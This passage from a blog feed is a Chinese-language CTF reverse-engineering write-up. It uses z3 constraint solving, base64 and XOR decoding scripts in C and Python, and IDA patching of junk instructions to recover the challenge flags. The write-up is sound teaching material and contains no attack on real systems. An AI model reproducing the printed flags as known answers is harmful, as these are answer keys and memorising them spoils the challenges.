<span class="number">331</span> * x2 + <span class="number">290</span> * x1 + <span class="number">396</span> * x0 + <span class="number">732</span> * x7 + <span class="number">511</span> * x8 + <span class="number">577</span> * x23 == <span class="number">1095191</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">268</span> * x22 + <span class="number">635</span> * x21 + <span class="number">854</span> * x20 + <span class="number">602</span> * x19 + <span class="number">493</span> * x18 + <span class="number">529</span> * x17 + <span class="number">501</span> * x16 + <span class="number">254</span> * x15 + <span class="number">634</span> * x14 + <span class="number">264</span> * x13 + <span class="number">808</span> * x12 + <span class="number">316</span> * x11 + <span class="number">861</span> * x8 + <span class="number">403</span> * x7 + <span class="number">126</span> * x6 + <span class="number">969</span> * x5 + <span class="number">200</span> * x4 + <span class="number">322</span> * x3 + <span class="number">254</span> * x2 + <span class="number">861</span> * x1 + <span class="number">858</span> * x0 + <span class="number">499</span> * x9 + <span class="number">513</span> * x10 + <span class="number">291</span> * x23 == <span class="number">1159761</span>)</span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">140</span> * x22 + <span class="number">645</span> * x21 + <span class="number">109</span> * x20 + <span class="number">108</span> * x19 + <span class="number">761</span> * x18 + <span class="number">808</span> * x17 + <span class="number">391</span> * x16 + <span class="number">392</span> * x15 + <span class="number">496</span> * x14 + <span class="number">441</span> * x13 + <span class="number">125</span> * x12 + <span class="number">585</span> * x11 + <span class="number">747</span> * x10 + <span class="number">649</span> * x9 + <span class="number">585</span> * x8 + <span class="number">962</span> * x7 + <span class="number">798</span> * x6 + <span class="number">609</span> * x5 + <span class="number">560</span> * x4 + <span class="number">590</span> * x3 + <span class="number">564</span> * x2 + <span class="number">396</span> * x1 + <span class="number">598</span> * x0 + <span class="number">747</span> * x23 == <span class="number">1148424</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solver.check())</span><br><span class="line">    <span class="built_in">print</span>(solver.model())</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_print</span>():</span><br><span class="line">    <span class="comment"># 调用之前要手动将solver的结果做一个处理,转换成合法的字典对象存入data中:</span></span><br><span class="line">    <span class="comment"># (仍然可以利用正则提高效率)</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;x11&#x27;</span>: <span class="number">117</span>,</span><br><span class="line">        <span class="string">&#x27;x0&#x27;</span>: <span class="number">102</span>,</span><br><span class="line">        <span class="string">&#x27;x20&#x27;</span>: <span class="number">88</span>,</span><br><span class="line">        <span class="string">&#x27;x9&#x27;</span>: <span class="number">121</span>,</span><br><span class="line">        <span class="string">&#x27;x13&#x27;</span>: <span class="number">107</span>,</span><br><span class="line">        <span class="string">&#x27;x16&#x27;</span>: <span class="number">119</span>,</span><br><span class="line">        <span class="string">&#x27;x17&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">        <span class="string">&#x27;x8&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">        <span class="string">&#x27;x14&#x27;</span>: <span class="number">110</span>,</span><br><span class="line">        <span class="string">&#x27;x2&#x27;</span>: <span class="number">97</span>,</span><br><span class="line">        <span class="string">&#x27;x22&#x27;</span>: <span class="number">125</span>,</span><br><span class="line">        <span class="string">&#x27;x10&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">        <span class="string">&#x27;x1&#x27;</span>: <span class="number">108</span>,</span><br><span class="line">        <span class="string">&#x27;x6&#x27;</span>: <span class="number">48</span>,</span><br><span class="line">        <span class="string">&#x27;x23&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;x21&#x27;</span>: <span class="number">33</span>,</span><br><span class="line">        <span class="string">&#x27;x18&#x27;</span>: <span class="number">85</span>,</span><br><span class="line">        <span class="string">&#x27;x3&#x27;</span>: <span class="number">103</span>,</span><br><span class="line">        <span class="string">&#x27;x12&#x27;</span>: <span class="number">95</span>,</span><br><span class="line">        <span class="string">&#x27;x15&#x27;</span>: <span class="number">111</span>,</span><br><span class="line">        <span class="string">&#x27;x19&#x27;</span>: <span class="number">80</span>,</span><br><span class="line">        <span class="string">&#x27;x4&#x27;</span>: <span class="number">123</span>,</span><br><span class="line">        <span class="string">&#x27;x5&#x27;</span>: <span class="number">110</span>,</span><br><span class="line">        <span class="string">&#x27;x7&#x27;</span>: <span class="number">119</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 按照 x 后的数字进行排序</span></span><br><span class="line">    sorted_data = <span class="built_in">sorted</span>(data.items(), key=<span class="keyword">lambda</span> item: <span class="built_in">int</span>(item[<span class="number">0</span>][<span class="number">1</span>:]))</span><br><span class="line">    <span class="comment"># 重组数据</span></span><br><span class="line">    end_result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(value) <span class="keyword">for</span> key, value <span class="keyword">in</span> sorted_data)</span><br><span class="line">    <span class="comment"># 输出转换好的flag</span></span><br><span class="line">    <span class="built_in">print</span>(end_result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先调用该函数,把输出结果手动放入my_print()中</span></span><br><span class="line">calculate()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后运行该函数,输出flag</span></span><br><span class="line"><span class="comment"># my_print()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先注释掉my_print(),运行结果就是各个变量的解</span></span><br><span class="line"><span class="comment"># 然后注释掉calculate(),取消注释my_print(),运行结果就是flag</span></span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223212410.png" alt="image-20231016223212410" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223245074.png" alt="image-20231016223245074" style="zoom:50%;" /><p><code>flag&#123;n0w_y0u_know_UPX!&#125;</code></p><h3 id="题目2-eazy-64x">题目2-eazy_64x</h3><p>用IDA打开,看到输入了长为20的字符串:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223719463.png" alt="image-20231016223719463" style="zoom:50%;" /><p>然后将字符串分割为3个一组的子串,并且最后一个分组是2个字符(因为总长20)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223744063.png" alt="image-20231016223744063" style="zoom:50%;" /><p>对每个子串(保存在dest中)调用encrypt()函数,进入其中,发现是一个标准的base64编码:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016223829530.png" alt="image-20231016223829530" style="zoom:50%;" /><p>同时发现,题目尽管进行了3个字符一组的单独base64,但是每组都是标准的base64,并且base64本身就是3个一组进行编码(因为<code>3\*8==4\*6</code>,如果不理解请去看base64编码的原理讲解).</p><p>所以我们直接将密文进行统一的一遍base64解码即可,无需多此一举把他们一组一组的进行解码.</p><p>再往下看,还有一个get_trans()函数,进去发现要对base64编码后的字符串的每一个字符和0x68进行异或:</p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20231016224428772.png" alt="image-20231016224428772" style="zoom:50%;" /><p>到此,我们才得到了密文,把他和全局变量glob去进行比较,所以最后的密文就在glob中,我们将其提取出来,反向操作即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016224525339.png" alt="image-20231016224525339" style="zoom:50%;" /><p>这里使用C语言进行解密:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> glob[] = &#123;</span><br><span class="line">            <span class="number">50</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">91</span>, <span class="number">27</span>, <span class="number">16</span>, <span class="number">48</span>, <span class="number">90</span>,</span><br><span class="line">            <span class="number">31</span>, <span class="number">31</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">90</span>,</span><br><span class="line">            <span class="number">50</span>, <span class="number">60</span>, <span class="number">33</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">88</span>, <span class="number">85</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(glob) / <span class="keyword">sizeof</span>(glob[<span class="number">0</span>]); ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(glob[i] ^ <span class="number">0x68</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ZmxhZ3sxX2wwdmVfcmV2ZTI1ZX0=</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016224712919.png" alt="image-20231016224712919" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">encode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *str, <span class="type">long</span> str_len)</span> &#123;</span><br><span class="line">    <span class="comment">//需要输入字节流的长度,因为中间可能有0</span></span><br><span class="line">    <span class="type">long</span> len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *res;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"><span class="comment">//定义base64编码表</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> base64_table[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算经过base64编码后的字符串长度</span></span><br><span class="line">    <span class="keyword">if</span> (str_len % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">        len = str_len / <span class="number">3</span> * <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        len = (str_len / <span class="number">3</span> + <span class="number">1</span>) * <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    res = (<span class="type">unsigned</span> <span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * len + <span class="number">1</span>);</span><br><span class="line">    res[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以3个8位字符为一组进行编码</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; j += <span class="number">3</span>, i += <span class="number">4</span>) &#123;</span><br><span class="line">        res[i] = base64_table[str[j] &gt;&gt; <span class="number">2</span>]; <span class="comment">//取出第一个字符的前6位并找出对应的结果字符</span></span><br><span class="line">        res[i + <span class="number">1</span>] = base64_table[(str[j] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span> | (str[j + <span class="number">1</span>]</span><br><span class="line">                &gt;&gt; <span class="number">4</span>)]; <span class="comment">//将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符</span></span><br><span class="line">        res[i + <span class="number">2</span>] = base64_table[(str[j + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span> | (str[j + <span class="number">2</span>]</span><br><span class="line">                &gt;&gt; <span class="number">6</span>)]; <span class="comment">//将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符</span></span><br><span class="line">        res[i + <span class="number">3</span>] = base64_table[str[j + <span class="number">2</span>] &amp; <span class="number">0x3f</span>]; <span class="comment">//取出第三个字符的后6位并找出结果字符</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (str_len % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            res[i - <span class="number">2</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            res[i - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            res[i - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *code)</span> &#123;</span><br><span class="line"><span class="comment">//根据base64表，以字符找到对应的十进制数据</span></span><br><span class="line">    <span class="type">int</span> table[] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">63</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>,</span><br><span class="line">                   <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                   <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line">                   <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                   <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>,</span><br><span class="line">                   <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>,</span><br><span class="line">                   <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>,</span><br><span class="line">                   <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">long</span> len;</span><br><span class="line">    <span class="type">long</span> str_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *res;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算解码后的字符串长度</span></span><br><span class="line">    len = <span class="built_in">strlen</span>((<span class="type">char</span> *) code);</span><br><span class="line"><span class="comment">//判断编码后的字符串后是否有=</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>((<span class="type">char</span> *) code, <span class="string">&quot;==&quot;</span>))</span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>((<span class="type">char</span> *) code, <span class="string">&quot;=&quot;</span>))</span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    res = (<span class="type">unsigned</span> <span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * str_len + <span class="number">1</span>);</span><br><span class="line">    res[str_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以4个字符为一位进行解码</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; j += <span class="number">3</span>, i += <span class="number">4</span>) &#123;</span><br><span class="line">        res[j] = ((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i]]) &lt;&lt; <span class="number">2</span> |</span><br><span class="line">                 (((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i + <span class="number">1</span>]])</span><br><span class="line">                         &gt;&gt; <span class="number">4</span>); <span class="comment">//取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合</span></span><br><span class="line">        res[j + <span class="number">1</span>] = (((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i + <span class="number">1</span>]]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">                     (((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i + <span class="number">2</span>]])</span><br><span class="line">                             &gt;&gt; <span class="number">2</span>); <span class="comment">//取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合</span></span><br><span class="line">        res[j + <span class="number">2</span>] = (((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i + <span class="number">2</span>]]) &lt;&lt; <span class="number">6</span>) |</span><br><span class="line">                     ((<span class="type">unsigned</span> <span class="type">char</span>) table[code[i +</span><br><span class="line">                                                 <span class="number">3</span>]]); <span class="comment">//取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> enc[<span class="number">100</span>] = <span class="string">&quot;ZmxhZ3sxX2wwdmVfcmV2ZTI1ZX0=&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *dec;</span><br><span class="line"></span><br><span class="line">    dec = (<span class="type">char</span> *) decode((<span class="type">unsigned</span> <span class="type">char</span> *) enc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decode result:\n%s\n&quot;</span>, dec);</span><br><span class="line"><span class="comment">// flag&#123;1_l0ve_reve25e&#125;</span></span><br><span class="line">    <span class="built_in">free</span>(dec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者用python也行,最后一步也可以用在线网站:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016225002172.png" alt="image-20231016225002172" style="zoom:50%;" /><p><code>flag&#123;1_l0ve_reve25e&#125;</code></p><h3 id="题目3-call-above-call">题目3-call_above_call</h3><p>本题考点是花指令.</p><p>使用DIE查看发现是32位程序,使用针对32位的IDA打开.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016231052743.png" alt="image-20231016231052743"></p><p>发现有花指令,我们将addr1标签对应的那个脏字节(即call指令的首字节)patch掉,即改为nop指令,以让IDA正常分析:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016232231238.png" alt="image-20231016232231238" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016232252709.png" alt="image-20231016232252709" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016232331575.png" alt="image-20231016232331575" style="zoom:50%;" /><p>patch后可以发现这段代码恢复正常了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016232826133.png" alt="image-20231016232826133" style="zoom:50%;" /><p>下面还有几个花指令,如法炮制,全都patch掉:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016234120309.png" alt="image-20231016234120309" style="zoom:50%;" /><p>出现数据后,选中所有数据(如果不成功选中脏字节后面的第一个字节,再不行就选中整个函数,按p快捷键先重新转为函数)按c快捷键转为代码.</p><p>最后统一再在函数开头按p重新生成函数即可恢复正常:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016234602048.png" alt="image-20231016234602048" style="zoom:50%;" /><p>可以看到原本的call之前也是一个call的脏字节,所以这题叫做call_above_call(</p><p>现在就能看C伪代码了.</p><p>首先输入了长为25的字符串:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016234854392.png" alt="image-20231016234854392" style="zoom:50%;" /><p>然后在wuhuwuhu()函数中进行循环异或加密,然后就和密文enc进行比较了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235004077.png" alt="image-20231016235004077" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235823404.png" alt="image-20231016235823404" style="zoom:50%;" /><p>但是跳转到enc发现是一个指针,我们根据最后的end_m函数中的free(enc)也能知道.</p><p>再往前看,发现有个generate()函数:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235354465.png" alt="image-20231016235354465" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235407645.png" alt="image-20231016235407645" style="zoom:50%;" /><p>abcdefg点进去看到是一个base编码的字符串,同时decode()函数似乎是一个base64解码:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235700446.png" alt="image-20231016235700446" style="zoom:50%;" /><p>我们又能找到encode()和标准字符表:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235727873.png" alt="image-20231016235727873" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016235741479.png" alt="image-20231016235741479" style="zoom:50%;" /><p>所以这就是一个base64编码.</p><p>那么我们只需要将密文进行base64解码(也可以动调得到),然后进行反向的循环异或即可得到flag,解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;Cg0GHEtJF1pZBAo8O1dRFxI4JgAdF1JcfQ==&#x27;</span></span><br><span class="line">enc = base64.b64decode(enc.encode()).decode()</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag.append(<span class="built_in">ord</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    flag[i] = flag[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;0yn4mic_d3bug_yyds!&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> Web </tag>
            
            <tag> PWN </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-XSCTF2023热身赛</title>
      <link href="/2023-10-13-867c7f3cb185/"/>
      <url>/2023-10-13-867c7f3cb185/</url>
      
